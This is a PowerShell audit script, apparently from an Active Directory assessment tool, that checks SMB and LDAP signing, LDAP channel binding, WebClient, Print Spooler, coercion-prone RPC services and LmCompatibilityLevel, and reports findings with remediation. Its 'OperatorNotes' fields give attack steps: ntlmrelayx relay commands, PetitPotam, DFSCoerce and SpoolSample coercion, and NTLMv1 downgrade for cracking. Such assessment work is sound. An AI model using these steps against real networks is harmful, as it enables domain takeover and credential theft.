#requires -Version 5.1


$role = Get-HostRole

# Server side: RequireSecuritySignature
$smbServerPath = 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters'
$serverRequire = Get-RegistryValueSafe -Path $smbServerPath -Name 'RequireSecuritySignature'
$serverEnable  = Get-RegistryValueSafe -Path $smbServerPath -Name 'EnableSecuritySignature'

# Client side
$smbClientPath = 'HKLM:\SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters'
$clientRequire = Get-RegistryValueSafe -Path $smbClientPath -Name 'RequireSecuritySignature'
$clientEnable  = Get-RegistryValueSafe -Path $smbClientPath -Name 'EnableSecuritySignature'

$BR2.Raw.SMBSigning = @{
    ServerRequire = $serverRequire
    ServerEnable  = $serverEnable
    ClientRequire = $clientRequire
    ClientEnable  = $clientEnable
}

# Windows 11 24H2 and Server 2025 default RequireSecuritySignature to 1 on
# both sides. Older OS versions: only DCs require by default.
if ($serverRequire -ne 1) {
    $sev = if ($role -eq 'DomainController') { 'Critical' } else { 'High' }
    $BR2.Findings.Add( (New-Finding `
        -CheckID 'BR-REL-001' `
        -Category 'NTLMRelay' `
        -Title 'SMB server signing is not required' `
        -Severity $sev `
        -Exploitability 'High' `
        -AttackPath 'NTLM relay to SMB (incl. relay from coerced machine account to this host)' `
        -MITRE 'T1557.001' `
        -Evidence @{
            RequireSecuritySignature = $serverRequire
            EnableSecuritySignature  = $serverEnable
            HostRole                 = $role
            Path                     = $smbServerPath
        } `
        -Remediation 'Set RequireSecuritySignature=1 under LanmanServer\Parameters. Windows 11 24H2 and Server 2025 default this to 1 on both client and server. Test with third-party NAS devices first becaause oftenen lack signing support.' `
        -OperatorNotes 'Without SMB signing this host accepts relayed NTLM authentications. Combine with a coercion primitive (PetitPotam, DFSCoerce, etc.) from ntlmrelayx or impacket. If this host runs a privileged service binding to SMB (shares, admin$, C$), relayed authentications from a domain admin target land with that authority.' `
        -References @(
            'https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591',
            'https://www.dsinternals.com/en/smb-signing-windows-server-2025-client-11-24h2-defaults/'
        )
    ))
}

if ($role -eq 'DomainController') {
    $ntdsPath = 'HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters'
    $ldapIntegrity = Get-RegistryValueSafe -Path $ntdsPath -Name 'LDAPServerIntegrity'
    $ldapChannelBinding = Get-RegistryValueSafe -Path $ntdsPath -Name 'LdapEnforceChannelBinding'

    $BR2.Raw.LDAPSigning = @{
        LDAPServerIntegrity       = $ldapIntegrity
        LdapEnforceChannelBinding = $ldapChannelBinding
    }

    # LDAPServerIntegrity: 0 = none, 1 = negotiated, 2 = required
    if ($ldapIntegrity -ne 2) {
        $BR2.Findings.Add( (New-Finding `
            -CheckID 'BR-REL-003' `
            -Category 'NTLMRelay' `
            -Title 'LDAP signing not required on domain controller' `
            -Severity 'Critical' `
            -Exploitability 'High' `
            -AttackPath 'NTLM relay to LDAP for RBCD / shadow credentials / ACL abuse' `
            -MITRE 'T1557' `
            -Evidence @{
                LDAPServerIntegrity = $ldapIntegrity
                Path                = $ntdsPath
            } `
            -Remediation 'Set LDAPServerIntegrity=2 under NTDS\Parameters to require signing. Microsoft flagged this as a recommended default since the ADV190023 advisory in 2020.' `
            -OperatorNotes 'LDAP relay is the highest-yield NTLM relay target: with a coerced machine account authentication, an operator can write msDS-AllowedToActOnBehalfOfOtherIdentity (RBCD), add shadow credentials (msDS-KeyCredentialLink), or flip userAccountControl bits. ntlmrelayx.py -t ldap://dc --delegate-access / --shadow-credentials. Even if channel binding is enforced for LDAPS, unbound LDAP remains exploitable.' `
            -References @(
                'https://msrc.microsoft.com/update-guide/vulnerability/ADV190023',
                'https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution'
            )
        ))
    }

    # LdapEnforceChannelBinding: 0 = off, 1 = when supported, 2 = always
    if ($ldapChannelBinding -ne 2) {
        $BR2.Findings.Add( (New-Finding `
            -CheckID 'BR-REL-004' `
            -Category 'NTLMRelay' `
            -Title 'LDAP channel binding not strictly enforced on domain controller' `
            -Severity 'High' `
            -Exploitability 'High' `
            -AttackPath 'NTLM relay over LDAPS (bypasses LDAP signing via TLS)' `
            -MITRE 'T1557' `
            -Evidence @{
                LdapEnforceChannelBinding = $ldapChannelBinding
                Path                      = $ntdsPath
            } `
            -Remediation 'Set LdapEnforceChannelBinding=2 under NTDS\Parameters. This is the LDAPS counterpart of LDAP signing and is often overlooked.' `
            -OperatorNotes 'LDAPS relay: ntlmrelayx.py -t ldaps://dc. Without channel binding, the TLS wrapper does not protect against the relay. This is the "LDAPS gap" that ntlmrelayx exploits against many hardened environments that only fixed LDAP signing.' `
            -References @(
                'https://support.microsoft.com/en-us/topic/2020-ldap-channel-binding-and-ldap-signing-requirements-for-windows-ef185fb8-00f7-167d-744c-f299a66fc00a'
            )
        ))
    }
}

$webclient = Get-Service -Name WebClient -ErrorAction SilentlyContinue
$webclientStart = if ($webclient) { (Get-CimInstance Win32_Service -Filter "Name='WebClient'").StartMode } else { $null }
$webclientState = if ($webclient) { $webclient.Status } else { $null }

$BR2.Raw.WebClient = @{
    Installed = [bool]$webclient
    StartMode = $webclientStart
    State     = $webclientState
}

if ($webclient -and $webclientState -eq 'Running') {
    $BR2.Findings.Add( (New-Finding `
        -CheckID 'BR-COE-001' `
        -Category 'Coercion' `
        -Title 'WebClient service is running (HTTP auth coercion -> relay)' `
        -Severity 'High' `
        -Exploitability 'High' `
        -AttackPath 'HTTP-based auth coercion (PrinterBug/WebDAV) relayed to LDAPS or AD CS' `
        -MITRE 'T1187' `
        -Evidence @{
            Installed = $true
            StartMode = $webclientStart
            State     = 'Running'
        } `
        -Remediation 'Set the WebClient service start mode to Disabled via Group Policy unless WebDAV is required. Most enterprise environments do not need it.' `
        -OperatorNotes 'WebClient running means this machine will dereference WebDAV URLs (http://attacker@port/share) and authenticate. WebDAV over HTTPS preserves NTLM (SMB coercion often gets intercepted by SMB signing; WebDAV sidesteps this). Use with Coercer --target $host or PetitPotam --listener http://attacker. Relay target: LDAPS for RBCD, or AD CS certsrv (ESC8) for a machine auth certificate. The NTLM auth from a WebClient-enabled machine is *Net-NTLMv2 without SPN*, which is relay-able to LDAPS if channel binding is absent.' `
        -References @(
            'https://github.com/p0dalirius/Coercer',
            'https://posts.specterops.io/certified-pre-owned-d95910965cd2'
        )
    ))
} elseif ($webclient -and $webclientStart -eq 'Manual') {
    # Manual start but triggerable by certain events/api calls
    $BR2.Findings.Add( (New-Finding `
        -CheckID 'BR-COE-001b' `
        -Category 'Coercion' `
        -Title 'WebClient service installed with Manual start (can be triggered)' `
        -Severity 'Medium' `
        -Exploitability 'Medium' `
        -AttackPath 'Trigger WebClient start, then HTTP auth coercion and relay' `
        -MITRE 'T1187' `
        -Evidence @{
            Installed = $true
            StartMode = $webclientStart
            State     = $webclientState
        } `
        -Remediation 'Disable the WebClient service rather than leaving it on Manual.' `
        -OperatorNotes 'WebClient on Manual will start on first WebDAV access by any local user. Trigger via "net use" to a WebDAV URL, or by spawning a named-pipe wrapper (James Forshaw has published WebDAV trigger primitives). Once running, proceed as per BR-COE-001. Potentially use https://github.com/Dec0ne/DavRelayUp or google others' `
        -References @('https://github.com/Gabriel-Dechichi/WebClient-Trigger')
    ))
}

$spooler = Get-Service -Name Spooler -ErrorAction SilentlyContinue
$spoolerState = if ($spooler) { $spooler.Status } else { $null }

$BR2.Raw.Spooler = @{
    Installed = [bool]$spooler
    State     = $spoolerState
}

if ($spooler -and $spoolerState -eq 'Running') {
    $sev = if ($role -eq 'DomainController') { 'Critical' } else { 'Medium' }
    $expl = if ($role -eq 'DomainController') { 'High' } else { 'Medium' }

    $BR2.Findings.Add( (New-Finding `
        -CheckID 'BR-COE-002' `
        -Category 'Coercion' `
        -Title "Print Spooler is running on $role" `
        -Severity $sev `
        -Exploitability $expl `
        -AttackPath 'PrinterBug (MS-RPRN) auth coercion -> relay or unconstrained delegation abuse' `
        -MITRE 'T1187' `
        -Evidence @{
            State    = 'Running'
            HostRole = $role
        } `
        -Remediation 'Disable Spooler on domain controllers and servers that are not print servers (Stop-Service Spooler; Set-Service Spooler -StartupType Disabled). For hosts that need it, apply the PrintNightmare mitigations (Point and Print restrictions, NoWarningNoElevationOnInstall=0).' `
        -OperatorNotes 'PrinterBug via MS-RPRN RpcRemoteFindFirstPrinterChangeNotificationEx: SpoolSample.exe or dementor.py from any authenticated user. Coerces the target machine account to authenticate to attacker-controlled listener. If the target has unconstrained delegation configured elsewhere, this yields a DC TGT. Otherwise combine with ntlmrelayx to LDAPS for RBCD. Note: Spooler is also the surface for PrintNightmare RCE (CVE-2021-34527) - verify KBs separately.' `
        -References @(
            'https://www.harmj0y.net/blog/activedirectory/not-a-security-boundary-breaking-forest-trusts/',
            'https://www.synacktiv.com/en/publications/abusing-multicast-poisoning-for-pre-authenticated-kerberos-relay-over-http-with',
            'https://github.com/dirkjanm/krbrelayx'
        )
    ))
}

# The other coercion primitives (EFSR, DFSNM, FSRVP, EVEN) are RPC interfaces.
# Detection approach: check whether the services exposing them are running.
# - MS-EFSR -> EFS (\\pipe\efsrpc) always available on DCs unless explicitly blocked
# - MS-DFSNM -> DFSR / DFS Namespace service (runs on DCs with DFS roles)
# - MS-FSRVP -> File Server VSS Agent Service
# - MS-EVEN -> EventLog (always running)

$coercionRpcSurfaces = @(
    @{ Name = 'EFS';           Service = 'EFS';            Primitive = 'PetitPotam (MS-EFSRPC)'       },
    @{ Name = 'DFS Replication'; Service = 'DFSR';         Primitive = 'DFSCoerce (MS-DFSNM)'          },
    @{ Name = 'FSRVP';         Service = 'fssagent';       Primitive = 'ShadowCoerce (MS-FSRVP)'       }
)

foreach ($rpc in $coercionRpcSurfaces) {
    $s = Get-Service -Name $rpc.Service -ErrorAction SilentlyContinue
    if ($s -and $s.Status -eq 'Running') {
        $sevMap = if ($role -eq 'DomainController') { 'High' } else { 'Medium' }
        $BR2.Findings.Add( (New-Finding `
            -CheckID ("BR-COE-" + $rpc.Service.ToUpper()) `
            -Category 'Coercion' `
            -Title ($rpc.Primitive + ' RPC surface exposed (' + $rpc.Name + ' service running)') `
            -Severity $sevMap `
            -Exploitability 'High' `
            -AttackPath ($rpc.Primitive + ' -> NTLM relay to LDAPS / ADCS HTTP / SMB') `
            -MITRE 'T1187' `
            -Evidence @{
                Service      = $rpc.Service
                State        = $s.Status
                HostRole     = $role
                Primitive    = $rpc.Primitive
            } `
            -Remediation 'Apply RPC filters to block the coercion interface UUIDs (netsh rpc filter commands), or disable the service if operationally viable. For PetitPotam, Microsoft published RPC filter guidance and the KB5005413 rollup.' `
            -OperatorNotes 'Coercer.py --target this-host will enumerate reachable coercion paths automatically. The newer primitives (DFSCoerce July 2022, ShadowCoerce January 2022) bypass the original PetitPotam patches. RPC filters blocking UUID 12345778-1234-abcd-ef00-0123456789ac (EFSRPC) and c681d488-d850-11d0-8c52-00c04fd90f7e (DFSNM) are effective but not applied by default.' `
            -References @(
                'https://github.com/p0dalirius/Coercer',
                'https://support.microsoft.com/en-us/topic/kb5005413-mitigating-ntlm-relay-attacks-on-active-directory-certificate-services-ad-cs-3612fc8b-8f17-49c3-84b0-4d4ca2be1c14',
                'https://github.com/topotam/PetitPotam'
            )
        ))
    }
}

$lmCompat = Get-RegistryValueSafe -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Lsa' -Name 'LmCompatibilityLevel'
$BR2.Raw.LmCompatibilityLevel = $lmCompat

if ($lmCompat -ne $null -and $lmCompat -lt 3) {
    $BR2.Findings.Add( (New-Finding `
        -CheckID 'BR-REL-007' `
        -Category 'NTLMRelay' `
        -Title "LmCompatibilityLevel is $lmCompat (NTLMv1 or LM accepted)" `
        -Severity 'High' `
        -Exploitability 'High' `
        -AttackPath 'NTLMv1 challenge/response downgrade, offline DES cracking via crack.sh' `
        -MITRE 'T1557.001' `
        -Evidence @{ LmCompatibilityLevel = $lmCompat } `
        -Remediation 'Set LmCompatibilityLevel=5 (Send NTLMv2 only, refuse LM & NTLM). Audit for legacy apps before enforcing.' `
        -OperatorNotes 'NTLMv1 hashes are DES-based with an 8-byte challenge. With a fixed challenge, cracking can return the NT hash usually in under 24 hours. Force NTLMv1 downgrade from responder via --lm (LLMNR/NBT-NS/mDNS poisoning) or via a coerced auth to your listener.' `
        -References @(
            'https://en.hackndo.com/ntlm-relay/'
        )
    ))
}
